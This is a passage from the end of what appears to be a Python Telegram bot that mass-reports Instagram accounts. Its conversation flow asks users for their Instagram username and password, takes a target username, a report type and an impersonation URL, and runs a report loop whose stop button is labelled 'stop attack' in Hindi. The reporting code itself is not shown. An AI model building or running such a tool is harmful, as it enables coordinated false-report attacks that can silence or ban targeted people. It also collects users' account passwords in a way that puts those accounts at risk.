            parse_mode='HTML'
        )
        return HELP_MENU
    except Exception as e:
        print(f"⚠️ Error in handle_help_menu handler: {e}")
        return HELP_MENU

async def change_language(update: Update, context: CallbackContext) -> int:
    try:
        query = update.callback_query
        await query.answer()
        
        user_id = str(query.from_user.id)
        new_lang = query.data.split('_')[2]
        user = get_user(user_id)
        
        if user:
            user['language'] = new_lang
            save_user(user_id, user)
            
            await query.edit_message_text(
                STRINGS[new_lang]['main_menu'].format(
                    name=user.get('display_name', 'User'),
                    ig_username=user.get('ig_username', ''),
                    reports=user.get('reports', 0)
                ),
                parse_mode='HTML'
            )
            
            await context.bot.send_message(
                chat_id=user_id,
                text=STRINGS[new_lang]['main_menu'].format(
                    name=user.get('display_name', 'User'),
                    ig_username=user.get('ig_username', ''),
                    reports=user.get('reports', 0)
                ),
                reply_markup=get_main_keyboard(new_lang, is_admin=(user_id == str(ADMIN_ID))),
                parse_mode='HTML'
            )
        return MAIN_MENU
    except Exception as e:
        print(f"⚠️ Error in change_language handler: {e}")
        return MAIN_MENU

def create_application():
    # Create application with conflict prevention settings
    return ApplicationBuilder().token(BOT_TOKEN).build()

def main():
    # Create application
    app = create_application()
    
    # Conversation handler
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            LANGUAGE: [CallbackQueryHandler(set_language, pattern='^lang_')],
            REGISTER: [MessageHandler(filters.TEXT & ~filters.COMMAND, register)],
            IG_USERNAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_ig_username)],
            IG_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_ig_password)],
            MAIN_MENU: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, main_menu),
                CallbackQueryHandler(change_language, pattern='^change_lang_')
            ],
            REPORT_MENU: [MessageHandler(filters.TEXT & ~filters.COMMAND, report_menu)],
            TARGET_USERNAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_target)],
            REPORT_TYPE: [CallbackQueryHandler(set_report_type, pattern='^type_')],
            IMPERSONATION_URL: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_impersonation_url)],
            REPORT_LOOP: [
                CallbackQueryHandler(start_reporting, pattern='^start_report$'),
                CallbackQueryHandler(cancel_reporting, pattern='^cancel_report$'),
                MessageHandler(filters.Regex(r'⏹️|अटैक बंद करें'), stop_reporting)
            ],
            ADMIN_PANEL: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_admin_buttons),
                CommandHandler('admin', admin_panel)
            ],
            BROADCAST_MESSAGE: [MessageHandler(filters.TEXT & ~filters.COMMAND, broadcast_message)],
            SETTINGS_MENU: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_settings_menu)],
            HELP_MENU: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_help_menu)]
        },
        fallbacks=[CommandHandler('start', start)]
    )
    
    app.add_handler(conv_handler)
    
    # Start the bot with conflict prevention
    print("🚀 Bot is running...")
    app.run_polling(
        drop_pending_updates=True,
        allowed_updates=Update.ALL_TYPES,
        timeout=20,
        poll_interval=1.0
    )

if __name__ == '__main__':
    max_retries = 5
    retry_delay = 2
    
    for attempt in range(max_retries):
        try:
            print(f"🚦 Starting bot attempt {attempt+1}/{max_retries}")
            
            # Render deployment check
            if os.environ.get('RENDER'):
                print("🌐 Render environment detected")
                print(f"🔌 Using PORT: {PORT}")
                print("⏳ Preventing instance conflicts...")
                time.sleep(random.uniform(1, 3))
            
            main()
            break
        except Conflict as e:
            print(f"⚠️ Telegram conflict error: {e}")
            if attempt < max_retries - 1:
                wait = retry_delay * (2 ** attempt) + random.uniform(0, 1)
                print(f"⏱️ Retrying in {wait:.1f} seconds...")
                time.sleep(wait)
            else:
                print("❌ Max retries reached for conflict errors")
                raise
        except Exception as e:
            print(f"❌ Critical error: {e}")
            raise
